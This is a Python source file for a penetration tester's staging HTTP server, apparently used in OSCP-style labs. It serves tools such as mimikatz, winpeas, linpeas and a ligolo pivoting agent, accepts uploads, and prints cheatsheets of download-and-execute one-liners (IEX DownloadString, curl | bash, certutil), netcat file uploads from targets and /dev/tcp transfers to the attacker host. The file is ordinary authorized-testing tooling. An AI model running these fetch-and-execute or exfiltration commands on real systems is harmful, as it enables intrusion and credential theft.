#!/usr/bin/python3

'''
	Simple HTTP server with shortcuts and tweaks
	Now serves both current directory AND ~/Scripts
	Runs in background, doesn't block terminal
'''
import http.server
import socketserver
import os
import sys
import subprocess
import cgi
import warnings
import signal

# Suppress deprecated cgi warnings
warnings.filterwarnings("ignore", category=DeprecationWarning, module="cgi")

def get_target_ip():
	if len(sys.argv) >= 3:
		return sys.argv[2]
	
	try:
		resultado = subprocess.check_output(["ip", "addr", "show", "tun0"]).decode("utf-8")
		lineas = resultado.split("\n")
		for linea in lineas:
			if "inet" in linea and "tun0" in linea:
				partes = linea.split()
				direccion_ip = partes[1].split("/")[0]
				return direccion_ip
	except subprocess.CalledProcessError:
		return "IP_KALI"

# Get IP and Port for banner
BANNER_IP = get_target_ip()
BANNER_PORT = 80
if len(sys.argv) >= 2:
	BANNER_PORT = int(sys.argv[1])

PORT = BANNER_PORT
SCRIPTS_DIR = os.path.expanduser("~/Scripts")
CURRENT_DIR = os.getcwd()

# Shortcuts
SHORTCUTS = {
	'/mm.exe': '/home/kali/Scripts/mimikatz64.exe',
	'/mm32.exe': '/home/kali/Scripts/mimikatz32.exe',
	'/mimikatz.exe': '/home/kali/Scripts/mimikatz64.exe',
	'/winpeas.exe': '/home/kali/Scripts/winpeas.exe',
	'/ligolo.exe': '/home/kali/Scripts/ligolo-ng/v2/windows/agent.exe',
	'/pspy': '/home/kali/Scripts/pspy64',
	'/pspy32': '/home/kali/Scripts/pspy32',
	'/linpeas': '/home/kali/Scripts/linpeas.sh',
	'/ligolo': '/home/kali/Scripts/ligolo-ng/agent',
	'/recon.sh': '/home/kali/Scripts/oscp-aux/recon.sh',
	'/recon.ps1': '/home/kali/Scripts/oscp-aux/recon.ps1',
	'/recon-pivot.ps1': '/home/kali/Scripts/oscp-aux/recon-pivot.ps1',
}

IP_REPLACE = ['/recon.sh', '/recon.ps1']

def ip_tun0():
	try:
		resultado = subprocess.check_output(["ip", "addr", "show", "tun0"]).decode("utf-8")
		lineas = resultado.split("\n")
		for linea in lineas:
			if "inet" in linea and "tun0" in linea:
				partes = linea.split()
				direccion_ip = partes[1].split("/")[0]
				return direccion_ip
	except subprocess.CalledProcessError:
		return "IP_KALI"


class MultiDirectoryHandler(http.server.SimpleHTTPRequestHandler):
	
	def translate_path(self, path):
		"""Override to serve from multiple directories"""
		# Decode URL path
		path = super().translate_path(path)
		
		# Get the relative path from the URL
		rel_path = os.path.relpath(path, os.getcwd())
		
		# Try current directory first
		current_path = os.path.join(CURRENT_DIR, rel_path)
		if os.path.exists(current_path):
			return current_path
		
		# Try Scripts directory
		scripts_path = os.path.join(SCRIPTS_DIR, rel_path)
		if os.path.exists(scripts_path):
			return scripts_path
		
		# Default to current directory (will 404 if not found)
		return current_path

	def do_GET(self):
		# Special route: /cheat/<filename> generates cheatsheet
		if self.path.startswith('/cheat/'):
			filename = self.path.replace('/cheat/', '')
			self.send_cheatsheet(filename)
			return
		
		# Check shortcuts first
		if self.path in SHORTCUTS:
			file_path = os.path.expanduser(SHORTCUTS[self.path])
			if os.path.isfile(file_path):
				print(f" [*] Shortcut -> Serving: {file_path}")
				self.send_file(file_path)
			else:
				print(f" [!] Shortcut file not found: {file_path}")
				self.send_error(404, f"Shortcut configured but file not found: {file_path}")
		else:
			try:
				super().do_GET()
			except (ConnectionResetError, BrokenPipeError) as e:
				print(f" [!] Connection closed by client: {e}")
			except Exception as e:
				print(f" [!] Error serving file: {e}")

	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		post_data = self.rfile.read(content_length)
		
		f_name = "uploaded_file"
		content_disposition = self.headers.get('Content-Disposition', '')
		if content_disposition:
			_, params = cgi.parse_header(content_disposition)
			f_name = params.get('filename', f_name)
		
		filename = os.path.join(CURRENT_DIR, f_name)
		with open(filename, 'wb') as file:
			file.write(post_data)

		self.send_response(200)
		self.end_headers()
		self.wfile.write(b'Received!!')
		print(f" [*] File received: {filename}")

	def send_file(self, file_path):
		try:
			with open(file_path, 'rb') as file:
				self.send_response(200)
				self.send_header('Content-type', 'application/octet-stream')
				self.send_header('Content-Disposition', 'attachment; filename=' + os.path.basename(file_path))
				
				if self.path in IP_REPLACE:
					file_content = file.read().decode('utf-8')
					file_content = file_content.replace('{IP_KALI}', ip_tun0())
					self.send_header('Content-Length', len(file_content.encode('utf-8')))
					self.end_headers()
					self.wfile.write(file_content.encode('utf-8'))
				else:
					file_size = os.path.getsize(file_path)
					self.send_header('Content-Length', str(file_size))
					self.end_headers()
					self.wfile.write(file.read())
					
				print(f" [✓] File sent: {os.path.basename(file_path)}")
				
		except (ConnectionResetError, BrokenPipeError):
			print(f" [!] Connection closed during transfer: {os.path.basename(file_path)}")
		except Exception as e:
			print(f" [!] Error sending file: {e}")
			try:
				self.send_error(500, str(e))
			except:
				pass

	def log_message(self, format, *args):
		print(f" [→] {self.client_address[0]} - {format % args}")

	def send_cheatsheet(self, filename):
		"""Generate and send cheatsheet for a specific file"""
		is_exe = filename.endswith('.exe')
		is_ps1 = filename.endswith('.ps1')
		is_sh = filename.endswith('.sh')
		is_script = is_ps1 or is_sh
		
		ip = ip_tun0()
		
		cheatsheet = f"""
╔════════════════════════════════════════════════════════════════════════════════╗
║                          📡 DOWNLOAD CHEATSHEET                                ║
╚════════════════════════════════════════════════════════════════════════════════╝

File: {filename}
URL:  http://{ip}:{PORT}/{filename}

"""

		if is_exe or not is_script:
			cheatsheet += f"""
#### 📦 WINDOWS DOWNLOAD
----
##### PowerShell
    IWR http://{ip}:{PORT}/{filename} -OutFile {filename}
    wget http://{ip}:{PORT}/{filename} -O {filename}
    (New-Object Net.WebClient).DownloadFile('http://{ip}:{PORT}/{filename}','{filename}')
    
##### CMD
    certutil -urlcache -f http://{ip}:{PORT}/{filename} {filename}
    bitsadmin /transfer job http://{ip}:{PORT}/{filename} %CD%\\{filename}
"""

		if is_exe:
			cheatsheet += f"""
##### Download + Execute
    IWR http://{ip}:{PORT}/{filename} -OutFile {filename}; .\\{filename}
    powershell -c "IWR http://{ip}:{PORT}/{filename} -O {filename}; .\\{filename}"
"""

		if is_ps1:
			cheatsheet += f"""
##### PowerShell Script Execution
    IEX(IWR http://{ip}:{PORT}/{filename} -UseBasicParsing)
    IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{PORT}/{filename}')
    powershell -ep bypass -c "IEX(IWR http://{ip}:{PORT}/{filename} -UseBasicParsing)"
"""

		cheatsheet += f"""
#### 🐧 LINUX DOWNLOAD
----
    wget http://{ip}:{PORT}/{filename} -O {filename}
    curl http://{ip}:{PORT}/{filename} -o {filename}
    curl -O http://{ip}:{PORT}/{filename}
"""

		if is_sh:
			cheatsheet += f"""
##### Download + Execute
    curl http://{ip}:{PORT}/{filename} | bash
    wget -qO- http://{ip}:{PORT}/{filename} | bash
    bash <(curl -s http://{ip}:{PORT}/{filename})
    
##### Source/Execute
    . <(curl http://{ip}:{PORT}/{filename})
    source <(curl -s http://{ip}:{PORT}/{filename})
"""

		if not is_script:
			cheatsheet += f"""
##### Download + Execute (binary)
    wget http://{ip}:{PORT}/{filename} -O {filename} && chmod +x {filename} && ./{filename}
    curl http://{ip}:{PORT}/{filename} -o {filename} && chmod +x {filename} && ./{filename}
"""

		cheatsheet += f"""
#### 💡 ALTERNATIVE METHODS
----
##### Python
    python -c "import urllib;urllib.urlretrieve('http://{ip}:{PORT}/{filename}','{filename}')"
    python3 -c "import urllib.request;urllib.request.urlretrieve('http://{ip}:{PORT}/{filename}','{filename}')"

##### Netcat Transfer
    [Server] nc -lvnp {PORT} < {filename}
    [Target] nc {ip} {PORT} > {filename}

##### /dev/tcp (bash)
    exec 3<>/dev/tcp/{ip}/{PORT}
    echo -e "GET /{filename} HTTP/1.0\\n" >&3
    cat <&3 > {filename}

"""
		
		# Send response
		self.send_response(200)
		self.send_header('Content-type', 'text/plain; charset=utf-8')
		self.send_header('Content-Length', len(cheatsheet.encode('utf-8')))
		self.end_headers()
		self.wfile.write(cheatsheet.encode('utf-8'))
		
		print(f" [*] Cheatsheet generated for: {filename}")


def print_banner():
	print(rf"""
 -----------------------------------------------------------------------------------------------
               _  _ ___ ___ ___     ____ _  _ _  _    ____ ____ _  _ ____ ____ 
               |__|  |   |  |__]    |__| |  |  \/     [__  |__/ |  | |___ |__/ 
               |  |  |   |  |       |  | |__| _/\_    ___] |  \  \/  |___ |  \ 
                                                                               
 -----------------------------------------------------------------------------------------------
                                                                                     gen0ne@~>

#### 🌐 DOWNLOAD SERVER ACTIVE
----
Base URL: http://{BANNER_IP}:{BANNER_PORT}/

#### 🎯 GENERATE CHEATSHEET
----
Local:  cheat <filename>                    # In your terminal (requires zshrc function)
Remote: curl http://{BANNER_IP}:{BANNER_PORT}/cheat/<filename>    # From target or browser

Examples:
    cheat mimikatz.exe
    cheat linpeas.sh 8080
    curl http://{BANNER_IP}:{BANNER_PORT}/cheat/nc.exe

#### 💀 Recon
----
iex ((New-Object System.Net.WebClient).DownloadString('http://{BANNER_IP}:{BANNER_PORT}/recon.ps1'))
iex ((New-Object System.Net.WebClient).DownloadString('http://{BANNER_IP}:{BANNER_PORT}/recon-pivot.ps1'))
. <(curl http://{BANNER_IP}:{BANNER_PORT}/recon.sh)

#### 📦 WINDOWS DOWNLOAD METHODS
----
##### PowerShell
Download:
    - IWR http://{BANNER_IP}:{BANNER_PORT}/file -OutFile file               # Invoke-WebRequest (PS3+)
    - IWR -Uri http://{BANNER_IP}:{BANNER_PORT}/file -OutFile file        # Full syntax
    - wget http://{BANNER_IP}:{BANNER_PORT}/file -O file                  # PS alias
    - curl http://{BANNER_IP}:{BANNER_PORT}/file -o file                  # PS alias
    - (New-Object Net.WebClient).DownloadFile('http://{BANNER_IP}:{BANNER_PORT}/file','file')
    - Start-BitsTransfer -Source http://{BANNER_IP}:{BANNER_PORT}/file -Destination file
Download + Execute:
    - IEX(IWR http://{BANNER_IP}:{BANNER_PORT}/file -UseBasicParsing)     # Execute PS script
    - IEX(New-Object Net.WebClient).DownloadString('http://{BANNER_IP}:{BANNER_PORT}/file')
    - powershell -c "IWR http://{BANNER_IP}:{BANNER_PORT}/file.exe -O file.exe; .\\file.exe"

##### CMD
    - certutil -urlcache -f http://{BANNER_IP}:{BANNER_PORT}/file file    # Classic
    - bitsadmin /transfer job http://{BANNER_IP}:{BANNER_PORT}/file %CD%\\file # Legacy

#### 🐧 LINUX DOWNLOAD METHODS
----
##### Basic
    - wget http://{BANNER_IP}:{BANNER_PORT}/file -O file                  # Rename
    - curl http://{BANNER_IP}:{BANNER_PORT}/file -o file                  # Save
    - curl -O http://{BANNER_IP}:{BANNER_PORT}/file                       # Keep name
Download + Execute:
    - curl http://{BANNER_IP}:{BANNER_PORT}/script.sh | bash              # Execute script
    - wget -qO- http://{BANNER_IP}:{BANNER_PORT}/script.sh | bash         # Quiet mode
    - bash <(curl -s http://{BANNER_IP}:{BANNER_PORT}/script.sh)          # Process substitution

#### 📡 NETCAT TRANSFER METHODS (TCP)
----
##### Upload (Target -> Server)
    - nc {BANNER_IP} {BANNER_PORT} < file
    - cat file | nc {BANNER_IP} {BANNER_PORT}
##### Download (Server -> Target)
    - [Server] nc -lvnp {BANNER_PORT} < file
    - [Target] nc {BANNER_IP} {BANNER_PORT} > file

#### 💡 ALTERNATIVE METHODS
----
    - /dev/tcp: exec 3<>/dev/tcp/{BANNER_IP}/{BANNER_PORT}; cat <&3 > file; cat file >&3
    - Python: python -c "import urllib;urllib.urlretrieve('http://{BANNER_IP}:{BANNER_PORT}/file','file')"
    - Python3: python3 -c "import urllib.request;urllib.request.urlretrieve('http://{BANNER_IP}:{BANNER_PORT}/file','file')"
    - PHP: php -r "file_put_contents('file',file_get_contents('http://{BANNER_IP}:{BANNER_PORT}/file'));"
    - Perl: perl -e 'use LWP::Simple; getstore("http://{BANNER_IP}:{BANNER_PORT}/file","file");'
    - Ruby: ruby -e 'require "open-uri"; download=open("http://{BANNER_IP}:{BANNER_PORT}/file");IO.copy_stream(download,"file")'

############################ ⚡ SHORTCUTS ⚡ ############################
----
# --- Windows Binaries ---
    - /mm.exe: /home/kali/Scripts/mimikatz64.exe
    - /mm32.exe: /home/kali/Scripts/mimikatz32.exe
    - /mimikatz.exe: /home/kali/Scripts/mimikatz64.exe
    - /winpeas.exe: /home/kali/Scripts/winpeas.exe
    - /ligolo.exe: /home/kali/Scripts/ligolo-ng/v2/windows/agent.exe

# --- Linux Binaries ---
    - /pspy /home/kali/Scripts/pspy64
    - /pspy32 /home/kali/Scripts/pspy32
    - /linpeas: /home/kali/Scripts/linpeas.sh
    - /ligolo: /home/kali/Scripts/ligolo-ng/agent

# --- Reconnaissance Scripts ---
    - /recon.sh: /home/kali/Scripts/oscp-aux/recon.sh
    - /recon.ps1: /home/kali/Scripts/oscp-aux/recon.ps1
    - /recon-pivot.ps1: /home/kali/Scripts/oscp-aux/recon-pivot.ps1

""")


def run_server():
	socketserver.TCPServer.allow_reuse_address = True
	
	with socketserver.TCPServer(("", PORT), MultiDirectoryHandler) as httpd:
		print(f" [>] Server running on port {PORT}")
		print(f" [>] TUN0 IP: {ip_tun0()}")
		print(f" [>] Serving directories:")
		print(f"     • Current: {CURRENT_DIR}")
		print(f"     • Scripts: {SCRIPTS_DIR}")
		print(f" [>] Shortcuts configured: {len(SHORTCUTS)}")
		print(f" [>] Server PID: {os.getpid()}")
		print(f" [>] To stop: kill {os.getpid()} or pkill -f httpTempServ\n")
		
		# Ignore SIGINT in child process (parent handles it)
		signal.signal(signal.SIGINT, signal.SIG_IGN)
		
		try:
			httpd.serve_forever()
		except Exception as e:
			print(f"\n [!] Server error: {e}")


if __name__ == "__main__":
	# Print banner in parent process
	print_banner()
	
	# Fork to background
	pid = os.fork()
	
	if pid > 0:
		# Parent process - exit immediately to return prompt
		print(f" [>] Server forked to background (PID: {pid})")
		print(f" [>] Logs will appear in this terminal")
		print(f" [>] To stop: kill {pid}\n")
		sys.exit(0)
	else:
		# Child process - run server
		run_server()
